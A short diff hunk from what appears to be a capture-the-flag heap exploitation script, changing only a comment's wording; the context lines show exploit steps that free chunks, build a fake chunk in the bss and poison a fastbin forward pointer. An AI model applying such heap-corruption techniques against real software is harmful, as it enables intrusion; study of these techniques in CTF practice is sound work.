@@ -50,7 +50,7 @@ def pwn():
 	free(0)
 	free(1)
 
-	# Craft fake chunk in the bss
+	# Craft a fake chunk in the bss
 	intro(p64(0)*13 + p64(0x50))
 
 	# fastbin's fd => fake chunk 
